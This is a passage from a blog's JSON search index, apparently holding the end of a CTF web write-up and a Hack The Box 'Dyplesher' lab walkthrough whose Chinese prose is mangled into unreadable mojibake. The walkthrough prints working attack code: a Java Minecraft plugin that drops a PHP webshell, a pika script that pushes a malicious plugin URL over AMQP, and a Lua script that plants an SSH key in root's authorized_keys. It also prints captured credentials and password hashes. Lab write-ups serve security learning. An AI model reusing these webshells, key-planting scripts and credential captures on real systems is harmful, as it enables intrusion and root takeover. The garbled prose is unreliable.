/&gt;&lt;input type=\"button\" class=\"part\" id=\"back\" value=\"â† Back\" /&gt;&lt;input type=\"submit\" class=\"part\" id=\"share\" name=\"share\" value=\"Share\" /&gt;&lt;input type=\"submit\" class=\"part\" id=\"equals\" /&gt;*/readfile(\"/flag\"))); ä¹‹åæ¥åˆ°calc.phpä¼ å€¼field=/*&amp;share=1å³å¯åœ¨é‡å®šå‘åå¾—åˆ°å†™å…¥shellçš„åœ°å€ã€‚è¿œç¨‹getflag summaryé¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä½“éªŒä¸é”™ã€‚åœ¨è¿™ä¹‹å‰çš„ä¸€åœº3kCTFå› ä¸ºæ—¶é—´åŸå› å†™ä¸äº†wpäº†,é¢˜ç›®è´¨é‡å€’æ˜¯æŒºå¥½çš„ã€‚ä¸‹å‘¨å¼€å§‹hwå°±ä¸æ›´æ–‡ç« ","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-Dyplesher","slug":"hackthebox-Dyplesher","date":"2020-07-24T00:23:57.000Z","updated":"2021-02-18T05:09:12.856Z","comments":true,"path":"2020/07/24/hackthebox-Dyplesher/","link":"","permalink":"https://www.bycsec.top/2020/07/24/hackthebox-Dyplesher/","excerpt":"Dyplesheré¶æœºæ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å®Œæˆçš„ç°å½¹insaneéš¾åº¦htbé¶æœºã€‚é¶æœºæ¶‰åŠçš„æœåŠ¡ç›¸å¯¹æ¯”è¾ƒå¤š,åŒ…æ‹¬web,gogs,minecraft,memcacheç­‰ç­‰ã€‚ä¸è¿‡è¯´å®è¯åšå®Œåæ„Ÿè§‰éš¾åº¦è·ŸTravelå·®ä¸å¤š,åˆ°ä¸äº†insaneéš¾åº¦ã€‚å¯èƒ½ä¸»è¦æ˜¯é‡Œé¢çš„JavaçŸ¥è¯†å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´åç¹çäº†ã€‚æ€»ä½“ä¸Šæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„ã€‚è¿™é‡Œè¿˜æ˜¯ç®€å•è®°å½•ä¸‹è¿‡ç¨‹ä»¥åŠææƒéƒ¨åˆ†å­¦åˆ°çš„çŸ¥è¯†å§ã€‚","text":"Dyplesheré¶æœºæ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å®Œæˆçš„ç°å½¹insaneéš¾åº¦htbé¶æœºã€‚é¶æœºæ¶‰åŠçš„æœåŠ¡ç›¸å¯¹æ¯”è¾ƒå¤š,åŒ…æ‹¬web,gogs,minecraft,memcacheç­‰ç­‰ã€‚ä¸è¿‡è¯´å®è¯åšå®Œåæ„Ÿè§‰éš¾åº¦è·ŸTravelå·®ä¸å¤š,åˆ°ä¸äº†insaneéš¾åº¦ã€‚å¯èƒ½ä¸»è¦æ˜¯é‡Œé¢çš„JavaçŸ¥è¯†å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´åç¹çäº†ã€‚æ€»ä½“ä¸Šæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„ã€‚è¿™é‡Œè¿˜æ˜¯ç®€å•è®°å½•ä¸‹è¿‡ç¨‹ä»¥åŠææƒéƒ¨åˆ†å­¦åˆ°çš„çŸ¥è¯†å§ã€‚ é¶æœºip:10.10.10.190 kaliip: 10.10.14.23 initial footholdé¦–å…ˆæ˜¯nmapåŸºæœ¬æ‰«æå¾—åˆ°ä¸‰ä¸ªç«¯å£22,80,3000.è¿›ä¸€æ­¥æ‰«æå‘ç°è¿˜æœ‰å…¶ä»–å‡ ä¸ªç«¯å£ã€‚4369(epmd),5672(amqp),11211ç­‰ã€‚ å…¶ä¸­11211æ˜¯memcacheå¯¹åº”ç«¯å£ã€‚ä¹‹å‰åœ¨travelä¸­ç”¨è¿‡,æ‰€ä»¥å°è±¡æ¯”è¾ƒæ·±åˆ»ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯ç®€å•ä»ä½ç«¯å£å¼€å§‹å®¡è®¡ã€‚ é¦–å…ˆweb80ç«¯å£å‘ç°æç¤ºè¿™é‡Œå¯èƒ½è·Ÿmcç›¸å…³ã€‚ä»cookieçš„é…ç½®å¯ä»¥çœ‹å‡ºä¼¼ä¹ä½¿ç”¨äº†laravelæ¡†æ¶ã€‚å› ä¸ºæ˜¯é»‘ç›’æ‰€ä»¥ä¸ç¡®å®šæ˜¯å¦èƒ½ç”¨RCEæ‰“ã€‚ æ¥ä¸‹æ¥é¦–é¡µè¿˜æç¤ºäº†æˆ‘ä»¬ä¸€ä¸ªå­åŸŸåtest.dyplesher.htbã€‚åŠ åˆ°hostsä¸­ã€‚ é¡µé¢çš„/staffæœ‰ä¸‰ä¸ªç”¨æˆ·å è¿™ä¸‰ä¸ªç”¨æˆ·ååœ¨åé¢ä¼šç»å¸¸å‡ºç°ã€‚ æ¥ä¸‹æ¥é¡µé¢ä¿¡æ¯æ”¶é›†å®Œäº†ã€‚æˆ‘ä»¬çˆ†ç ´ä¸‹è·¯å¾„ã€‚å‘ç°å­˜åœ¨/loginé¡µé¢ã€‚ç®€å•å°è¯•ç™»å½•æœªæœ,çœ‹æ¥éœ€è¦å¦å¤–æ”¶é›†ä¿¡æ¯,æˆ–è€…loginä¸æ˜¯ç›®çš„ã€‚ 3000ç«¯å£æ˜¯ä¸ªgogsæœåŠ¡ã€‚æä¾›gitçš„è¯çœ‹æ¥æ˜¯åˆæœ‰ä¿¡æ¯æ³„éœ²äº†ã€‚ä¸è¿‡åŒæ ·æˆ‘ä»¬æ²¡æœ‰å¯ç”¨çš„ä¿¡æ¯ã€‚ä¸è¿‡gogså€’æ˜¯åœ¨userså¤„æç¤ºæˆ‘ä»¬æœ‰åˆšåˆšä¸Šé¢çš„ä¸‰ä¸ªç”¨æˆ·ã€‚ æ¥ä¸‹æ¥å»å¾€test.dyplesher.htb.é¡µé¢åªæ¥å—ä¸¤ä¸ªå‚æ•°,ä¼¼ä¹æ˜¯åœ¨åˆ¤æ–­ä½ çš„ä¸¤ä¸ªè¾“å…¥æ˜¯å¦ä¸€è‡´ã€‚ç„¶åå°è¯•æ³¨å…¥ä¹Ÿæœªæœã€‚ ç»§ç»­æ‰«ç›®å½•ã€‚å¾—åˆ°.gitæ³„éœ²ã€‚ä½¿ç”¨githackdumpä¸‹æ¥ã€‚å¾—åˆ°index.phpæºç  123456789101112131415161718192021222324252627&lt;HTML&gt;&lt;BODY&gt;&lt;h1&gt;Add key and value to memcache&lt;h1&gt;&lt;FORM METHOD=\"GET\" NAME=\"test\" ACTION=\"\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"add\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"val\"&gt;&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?phpif($_GET['add'] != $_GET['val'])&#123; $m = new Memcached(); $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true); $m-&gt;setSaslAuthData(\"felamos\", \"zxcvbnm\"); $m-&gt;addServer('127.0.0.1', 11211); $m-&gt;add($_GET['add'], $_GET['val']); echo \"Done!\";&#125;else &#123; echo \"its equal\";&#125;?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; å¾—åˆ°ä¸€ç»„memcacheè´¦æˆ·ã€‚å°è¯•webé¡µé¢çš„ç™»å½•æœªæœã€‚äºæ˜¯ç›´æ¥è¿æ¥memcache.æ­¤å¤„æˆ‘ä»¬ä½¿ç”¨nodejsçš„memcache-cli.npmå…¨å±€ä¸‹è½½å³å¯ã€‚ 1memcache-cli felamos:zxcvbnm@10.10.10.190:11211 è¿æ¥ä¸Šåæ”¶é›†åˆ°ä¸‰ä¸ªç”¨æˆ·å(è¿˜æ˜¯ä¸Šé¢ä¸‰ä¸ªäºº)ä»¥åŠä¸‰ä¸ªbcryptå¯†ç ã€‚ 123$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS hashcatçˆ†ç ´ä¹‹.åªå¾—åˆ°ä¸€ç»„felamoså¯†ç mommy1ã€‚ ç»§ç»­ç”¨è¿™ç»„è´¦æˆ·å°è¯•ç™»å½•ã€‚æœ€ååœ¨gogså¤„ç™»å½•æˆåŠŸã€‚åœ¨80ç«¯å£ä»ç„¶ä¸èƒ½ç™»å½•,ä¸€åº¦è®©æˆ‘ä»¥ä¸ºé‚£ä¸ªç™»å½•æ˜¯å‡çš„ã€‚ å®¡æŸ¥ç”¨æˆ·felamosçš„ä»“åº“ã€‚åªæœ‰gitlabè·Ÿmemcachedä¸¤ä¸ªã€‚å…¶ä¸­memcachedçš„æˆ‘ä»¬å·²ç»æ”¶é›†è¿‡äº†ã€‚gitlabä»“åº“å‘ç°æ²¡æœ‰å†…å®¹,ä½†æ˜¯æœ‰release. ä¸‹è½½releaseä¸­çš„repo.zip(20mbä¸‹äº†å¿«åŠå°æ—¶â€¦â€¦éš¾å—)å¹¶è§£å‹ã€‚ 12345678910111213141516root@byc404:~/htb/boxes/Dyplesher/git/repositories# find .../@hashed./@hashed/4e./@hashed/4e/07./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle./@hashed/6b./@hashed/6b/86./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle./@hashed/4b./@hashed/4b/22./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle./@hashed/d4./@hashed/d4/73./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle è¿™é‡Œæœ‰.bundleæ–‡ä»¶ã€‚æˆ‘ä»¬å•ç‹¬æ‹¿å‡ºæ¥å¹¶git cloneã€‚ 123456#!/bin/bashfor i in $(find ../repositories | grep bundle)do git clone $idone bundle cloneå®Œåçš„å†…å®¹å°±æœ‰ç‚¹å¤šäº†ã€‚åŒæ ·ç®€å•çœ‹ä¸‹å››ä¸ªä»“åº“çš„å†…å®¹,æœ‰çš„æ˜¯è·Ÿmcæœ‰å…³ã€‚æœ‰çš„æ˜¯phpbashshellæœ‰å…³ã€‚å†æ¬¡findä¸‹æ‰¾åˆ°ä¸€ä¸ªsqliteçš„dbæ–‡ä»¶users.dbã€‚ç›´æ¥è¿›å…¥db.select * from users.å¾—åˆ° 118fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|&#x2F;192.168.43.81 åˆæ˜¯ä¸€ä¸ªbcryptå¯†ç ã€‚å†åº¦hashcatç ´è§£å¾—åˆ°alexis1 è¿™æ¬¡æˆ‘ä»¬ç»ˆäºèƒ½ç™»å½•è¿›80ç«¯å£çš„é¡µé¢äº†ã€‚è¿›å…¥åå‘ç°æ˜¯ä¸€ä¸ªæ§åˆ¶å°ã€‚é‡Œé¢æ˜¾ç¤ºçš„æ˜¯mcä¿¡æ¯ã€‚ç„¶ååŠŸèƒ½åŒ…æ‹¬ä¸Šä¼ pluginè·Ÿé‡æ–°åŠ è½½æŒ‡å®šplugin. emmè™½ç„¶æ²¡ç©è¿‡æ­£ç‰ˆmcä½†æ˜¯è‡³å°‘çŸ¥é“å®ƒæ˜¯javaå†™çš„ã€‚æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹å‘ç°æœ‰éå¸¸å…¨é¢çš„æŒ‡å—ã€‚æ„Ÿè§‰å°±ç®—ä¸ä¼šjavaçš„äººä¹Ÿèƒ½è·Ÿç€åšäº†ã€‚å½“ç„¶è¿™é‡Œæˆ‘åˆšå¥½å‰ä¸€å¤©ç®€å•å­¦ä¹ äº†ä¸‹mavençš„ä½¿ç”¨ã€‚æ‰€ä»¥å°±ideaç›´æ¥ä¸Šæ‰‹mavené¡¹ç›®ã€‚ å…·ä½“å‚è€ƒè¿™ç¯‡æ–‡ç« ,æˆ‘å°±ç®€å•åšä¸‹è§£é‡Š,å½“åšideaå­¦ä¹ ç¬”è®°äº†ã€‚ é¦–å…ˆæ˜¯pom.xmlé…ç½® 123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;top.bycsec&lt;/groupId&gt; &lt;artifactId&gt;java_mc_exp&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.encoding&gt;UTF-8&lt;/maven.compiler.encoding&gt; &lt;java.version&gt;10&lt;/java.version&gt; &lt;maven.compiler.source&gt;10&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;10&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spigotmc-repo&lt;/id&gt; &lt;url&gt;https://hub.spigotmc.org/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.spigotmc&lt;/groupId&gt; &lt;artifactId&gt;spigot-api&lt;/artifactId&gt; &lt;version&gt;1.16.1-R0.1-SNAPSHOT&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; groupIDè¿™ç§å»ºé¡¹ç›®å‰å°±åº”è¯¥å·²ç»è®©æˆ‘ä»¬è‡ªå·±é…ç½®å¥½äº†ã€‚æˆ‘æŒ‰ç…§æ­£å¸¸æ ‡å‡†å®šä¸ºtop.bycsec.ç„¶åä¸‹é¢propertiesçš„è®¾å®šæ˜¯ä¸€ä¸ªå°å‘ã€‚å› ä¸ºè‡ªå·±ideaçš„jdkç‰ˆæœ¬è·Ÿç³»ç»Ÿä¸ä¸€è‡´,ç„¶åè¿˜æœ‰ç³»ç»Ÿçš„è¯­è¨€levelæ°´å¹³ç­‰ç­‰é—®é¢˜ã€‚å¯¼è‡´mavenç¼–è¯‘æ—¶ä¼šå‡ºç°æŠ¥é”™â€ä¸æ”¯æŒå‘è¡Œç‰ˆæœ¬5â€.ç»å¸¸æ”¹å®Œäº†é…ç½®è¿˜æ˜¯æŠ¥é”™ã€‚è§£å†³æ–¹æ³•åªæœ‰åƒä¸Šé¢é‚£æ ·æŒ‰ç…§è‡ªå·±çš„æ ‡å‡†é…ç½®pom.xmlæ‰èƒ½é¿å…æŠ¥é”™ã€‚ ä¸‹é¢çš„ä»“åº“æ˜¯spigot ç»™mcç”¨çš„mavenä»“åº“ã€‚æˆ‘ä»¬ä¼šç”¨åˆ°çš„spigot-apiå¾—å»å¯¹åº”çš„ä»“åº“ä¸‹è½½ã€‚ ç„¶åæœ€ç»ˆå®Œæ•´çš„ç›®å½•ç»“æ„å¦‚ä¸‹ã€‚ resourceså³å¤–éƒ¨èµ„æºåŒ…ä¸­éœ€è¦plugin.ymlæ¥æŒ‡å®špluginä¿¡æ¯ã€‚è¿™é‡Œéå¸¸é‡è¦ã€‚å› ä¸ºæˆ‘ä»¬åé¢è¦ç”¨åˆ°pluginçš„å‘½å­—ã€‚å…¶ä¸­ä¼¼ä¹ä¸èƒ½åŒ…å«_è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥ç›´æ¥å–ä¸€ä¸ªæ­£å¸¸çš„åå­—ã€‚ ç„¶åæ˜¯mainä¸‹ç¼–å†™ã€‚è¿™é‡Œæˆ‘ä»¬å› ä¸ºä¸æ˜¯ç”¨çš„mvnåˆ›å»ºçš„,æ˜¯ä¸ä¼šæŒ‡å®šåŒ…çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è‡ªå·±å»ºä¸ªåŒ…top.bycsec.pluginå¹¶æ–°å»ºPluginExpä½œä¸ºè¦åŠ è½½çš„ä¸»ç±»ã€‚åŒæ—¶plugin.ymlä¸­ä¹Ÿå°†è¿™ä¸ªç±»æŒ‡å®šä¸ºåŠ è½½çš„ä¸»ç±»ã€‚ æ¥ä¸‹æ¥æ˜¯åˆ©ç”¨ç±»çš„ç¼–å†™ 1234567891011121314151617181920212223242526272829303132333435package top.bycsec.plugin;import org.bukkit.plugin.java.JavaPlugin;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;public class PluginExp extends JavaPlugin &#123; @Override public void onEnable() &#123; final String code=\"&lt;?php @system($_REQUEST[byc]);?&gt;\"; try &#123; File file = new File(\"/var/www/html/bycshell.php\"); if (!file.exists()) &#123; File dir = new File(file.getParent()); dir.mkdirs(); file.createNewFile(); &#125; FileOutputStream outStream = new FileOutputStream(file); outStream.write(code.getBytes()); outStream.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; super.onEnable(); &#125; @Override public void onDisable() &#123; super.onDisable(); &#125;&#125; é¦–å…ˆæ³¨æ„æ’ä»¶ç±»å¿…é¡»ç»§æ‰¿JavaPluginã€‚è¿™ä¸ªmavenä¸‹è½½ä¾èµ–æ—¶ä¼šå¸®æˆ‘ä»¬ä¸‹å¥½ã€‚ç„¶ååªéœ€é‡å†™ä¸¤ä¸ªæ–¹æ³•å³å¯ã€‚æˆ‘ä»¬ä½¿ç”¨onEnableæ’å…¥æ¶æ„ä»£ç ,è¿™æ ·å°±å¯ä»¥åœ¨æ’ä»¶ç”Ÿæ•ˆæ—¶ç›´æ¥æ‰§è¡Œã€‚ è¿™é‡Œé€‰æ‹©å†™å…¥webshellåŸå› æœ‰ç‚¹å¤šã€‚é¦–å…ˆé¢˜ç›®é¶æœºå±…ç„¶æ˜¯ä¸é€šå¤–ç½‘çš„ã€‚è¿™ä¸ªæˆ‘çœŸæ²¡æƒ³åˆ°ã€‚å…¶æ¬¡javaé¡¹ç›®å¤§å¤šé…ç½®å¥½äº†ä¸€äº›ç¦æ­¢ç±»ã€‚runtimeå¾ˆæœ‰å¯èƒ½æ˜¯è¡Œä¸é€šçš„ã€‚æ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥å†™å…¥webshell(çŒœäº†ä¸€æ‰‹laravelå¯¹åº”çš„å°±æ˜¯htmlæ–‡ä»¶å¤¹è€Œä¸æ˜¯dyplesher.htb) æœ€åå®Œæˆåæˆ‘ä»¬ä½¿ç”¨mavenç¼–è¯‘æ‰“åŒ…ã€‚ç›´æ¥åŒå‡»å³è¾¹mavençš„ç”Ÿå‘½å‘¨æœŸä¸­çš„packageå³å¯åˆ›å»ºå¯¹åº”jar file. å›åˆ°ç½‘é¡µä¸Šä¼ pluginå¹¶ä½¿ç”¨pluginåbyc404 reload. å†™å…¥webshell. ç„¶ååˆ°è¿™ä¸€æ­¥åæ‰çœŸæ­£æ„è¯†åˆ°é¶æœºä¸é€šå¤–ç½‘ã€‚æ‰€ä»¥å¸¸è§„å¼¹shellä¸å¯è¡Œã€‚åªèƒ½å°è¯•å†™å…¥sshå…¬é’¥ã€‚ æˆåŠŸç™»é™†ã€‚ å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†éš¾åº¦å…¶å®è¿˜å¥½ã€‚ä¸»è¦æ—¶é—´éƒ½èŠ±åœ¨çˆ†ç ´å¯†ç ä»¥åŠç¼–å†™javaçš„expæ—¶è¢«ideaçš„æŠ¥é”™ç»™å›°æ‰°äº†ä¸€å°ä¼šä¸Šäº†ã€‚ä½†æ˜¯è€å®è¯´ç¡®å®æ²¡æœ‰ä»€ä¹ˆéš¾åº¦ã€‚æ­£å¥½è®©è‡ªå·±æŠŠåˆšå­¦çš„mavenå·©å›ºäº†ä¸€ä¸‹ã€‚ä¸€ä¸¾ä¸¤å¾—ã€‚ privesc to userç®€å•çœ‹ä¸‹useræ–‡ä»¶å¤¹ä¸‹æœä¸å…¶ç„¶è¿˜æœ‰yuntaoè·Ÿfelamosä¸¤ä¸ªç”¨æˆ· æ¥ä¸‹æ¥åœ¨ä½¿ç”¨MinatoTWçš„idæ—¶å‘ç°ä¸€ä¸ªé‡è¦ä¿¡æ¯ 1uid&#x3D;1001(MinatoTW) gid&#x3D;1001(MinatoTW) groups&#x3D;1001(MinatoTW),122(wireshark) MinatoTWæ˜¯wiresharkç”¨æˆ·ç»„çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨é¶æœºä¸Šçš„wiresharkæŠ“åŒ…ã€‚ç¡®è®¤äº†ä¸‹ç½‘å¡åº”è¯¥æ˜¯lo.(loä»£è¡¨127.0.0.1ï¼Œå³localhost) 1tshark -i lo -F pcap -w byc.pcap æŠ“ä¸€æ®µæ—¶é—´çš„åŒ…åç”¨wiresharkæ‰“å¼€åˆ†æ.è·Ÿä¸‹tcpæµ å¾ˆå¿«å°±èƒ½æŠ“åˆ°å…³é”®ä¿¡æ¯ 123AMQPLib.platformS....PHP.versionS....2.11.1.informationS.... copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...EashAnicOc3Op.en_US. è¿™ä¸€æ®µä¼¼ä¹æ˜¯AMQPçš„é€šä¿¡å†…å®¹ã€‚å…¶ä¸­æœ‰ä¸€ç»„ç”¨æˆ·å¯†ç yuntao:EashAnicOc3Op å¹¶ä¸”ç´§æ¥ç€ä¸‹é¢å°±æœ‰å¤šç»„ç”¨æˆ·ä¿¡æ¯ã€‚ä¼¼ä¹æ¥è‡ªäºmc 1234&#123;\"name\":\"MinatoTW\",\"email\":\"MinatoTW@dyplesher.htb\",\"address\":\"India\",\"password\":\"bihys1amFov\",\"subscribed\":true&#125;&#123;\"name\":\"yuntao\",\"email\":\"yuntao@dyplesher.htb\",\"address\":\"Italy\",\"password\":\"wagthAw4ob\",\"subscribed\":true&#125;&#123;\"name\":\"felamos\",\"email\":\"felamos@dyplesher.htb\",\"address\":\"India\",\"password\":\"tieb0graQueg\",\"subscribed\":true&#125; ç»æµ‹è¯•å‘ç°è¿™ä¸‰ç»„å¯†ç å‡ä¸ºç³»ç»Ÿç”¨æˆ·å¯†ç ã€‚suåå³å¯åœ¨felamosæ–‡ä»¶å¤¹ä¸‹æ‹¿åˆ°user.txt privesc to rootæ¥ä¸‹æ¥åœ¨felamosæœ‰ä¸€ä¸ªyuntaoçš„æ–‡ä»¶å¤¹ã€‚é‡Œé¢å†™ç€send.sh 123#!/bin/bashecho 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data \"Exchange\" and \"Queue\". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' &gt; /dev/pts/&#123;&#125; cuberite plugins æ˜¯ä»¥luaè¯­è¨€ç¼–å†™çš„æ’ä»¶ã€‚è€Œè¿™é‡Œçš„ä¿¡æ¯ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„luaæ’ä»¶æ¥è¿›è¡Œprivesc.å¹¶ä¸”æç¤ºè¯´åªè¦æä¾›luaçš„urlåœ°å€å°±å¯ä»¥å°†æ’ä»¶åŠ å…¥æœåŠ¡ã€‚ â€œExchangeâ€ and â€œQueueâ€ çš„å«ä¹‰åœ¨æˆ‘è¿›è¡Œäº†ä¸€äº›ç®€å•çš„enumåå‘ç°åº”è¯¥æ˜¯AMQPæ‰€ç”¨åˆ°çš„ã€‚ç”±äºæˆ‘ä»¬ä¸€å¼€å§‹å°±å‘ç°AMQPç«¯å£æ˜¯å¯¹å¤–çš„,è€Œä¸”åˆšåˆšwiresharkæŠ“åˆ°äº†ä¸€ç»„yuntaoçš„è´¦æˆ·è¿˜æ²¡ç”¨ä¸Šã€‚æå¤§å¯èƒ½å°±æ˜¯åˆ©ç”¨amqpå»è¿›è¡Œé€šä¿¡åŠ è½½luaæ’ä»¶ã€‚ è¿™é‡Œé¶æœºä¸Šè·‘ç€çš„æ˜¯RabbitMQ.è€ŒRabbitMQé»˜è®¤æ˜¯rootæƒé™è·‘çš„ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥åœ¨é¶æœºä¸Šæ‰¾åˆ°è¿è¡Œä¿¡æ¯ã€‚ æˆ‘ä»¬çœ‹çœ‹ä¸€å¥— MQ å®Œæ•´æµç¨‹æ˜¯ä»€ä¹ˆæ ·çš„ï¼š é¦–å…ˆå°† RabbitMQ æœåŠ¡å¯åŠ¨ Producer 1ã€åˆ›å»ºä¸€ä¸ª connection2ã€åœ¨ connection åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªé¢‘é“ channel3ã€åœ¨é¢‘é“ channel ä¸Šå£°æ˜ä¸€ä¸ª exchangeï¼Œå‚æ•°ä¸º exchange çš„ç±»å‹å’Œåç§°4ã€åœ¨é¢‘é“ channel ä¸Šå‘å¸ƒæ¶ˆæ¯ï¼Œå‚æ•°ä¸º exchange çš„åç§°ä»¥åŠè·¯ç”± (routing_key) ä»¥åŠæ¶ˆæ¯ä½“5ã€å…³é—­ connection è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‰é¢çš„æç¤ºä¸­plugin_dataå¯èƒ½å°±æ˜¯è·¯ç”±ã€‚è€Œæˆ‘ä»¬è¦ä¼ é€’çš„æ¶ˆæ¯ä½“å°±æ˜¯luaçš„url.æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨python çš„pikaè¿›è¡Œç¼–å†™ 12345678910import pikacreds=pika.PlainCredentials('yuntao','EashAnicOc3Op')params=pika.Connectionparams('10.10.10.190',5672,'/',creds)conn=pika.BlockingConnection(params)channel = conn.channel()channel.basic_publish(exchange='', routing_key='plugin_data',body=\"http://127.0.0.1:9001/exp.lua\")conn.close() ç„¶åå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„luaè„šæœ¬ã€‚ç”±äºluaåå¼¹shellæˆ‘å‘ç°ä¼¼ä¹éƒ½æ˜¯ä¸äº¤äº’çš„ï¼Œæ‰€ä»¥é€‰æ‹©å†™ssh key 123f=io.open(\"/root/.ssh/authorized_keys\", \"w\")f:write(\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1dF791Ph8rC/PU4fXFjW4rBuU8JbmozNWx1kll3NA5r/vhpG05UZ/7dl8+Hs+bbnv/4TMferXgPj27QFJNGBuEfM+ZVO9ah5QNTwrO26vlCP885GyO0RoAoFM0ZNQaYfim1j6zrnplgWtJ7rIHRyrxt6ZDCFq7hGQm8CQP1xbVeaYoYYYHAVVt3IxDbeHh5pJsZDNvzsh1RZNCQlLdwvpoDdWhNPYq+lNYWSjGmW9nMVgQzcY1rk2IEf0Cg5NbZyFtBHITEG0myWIEXtg8D+t9f3IZbgzjaXkN4lVbGAGhNHvfrCemrmTWCbfpuoSS7mE65qfo87yVJdxwWYbx47fe0FMGtDBexa/+WyRApN+E/n3D+Dk56bnzSWiWzzxQptxJVPnM+txWOA6aixGb0PJpO1Wa2S29kg1C4GLNaEKXupursO7Vewq4ZCyzQmeWi2g8BljNqjIA89C9v2cRyFx+lIILxwNn2xbjVVf/WYjcE3lXLpqqz2CzCfuR+4xbSU= root@byc404\")f:close() åœ¨é¶æœºä¸Šèµ·ä¸ªpythonç›‘å¬9001,ç„¶åkaliè¿è¡Œè„šæœ¬ã€‚çœ‹åˆ°é¶æœºä¸Šè·å–åˆ°luaè„šæœ¬åå°±å¯ä»¥root sshç™»å½•äº†ã€‚ rooted. summary insaneéš¾åº¦çš„é¶æœºé¦–å…ˆç¡®å®æœ‰ä¸€å®šéš¾åº¦ã€‚ä¸è¿‡æ•´ä½“ä¸Šæˆ‘æ„Ÿè§‰è·Ÿtraveléš¾åº¦å·®ä¸å¤šã€‚ä¸»è¦enumçš„è¿‡ç¨‹æ²¡æœ‰é‚£ä¹ˆæ¯ç‡¥,è€Œåˆ©ç”¨èµ·æ¥çš„éš¾åº¦ä¹Ÿæ²¡é‚£ä¹ˆé«˜ã€‚ä½†æ˜¯æ€»å½’è¿˜æ˜¯å¾ˆæœ‰æ°´å¹³çš„é¶æœºã€‚éœ€è¦æˆ‘ä»¬è€å¿ƒçš„å»æ•´åˆä¿¡æ¯å¹¶å­¦ä¹ æ–°çŸ¥è¯†ã€‚ç¼–å†™mcè·Ÿluaæ’ä»¶éƒ½æ˜¯æé†’æˆ‘ä»¬ä¸è¦ä»»æ„å…è®¸ç”¨æˆ·ä¸Šä¼ 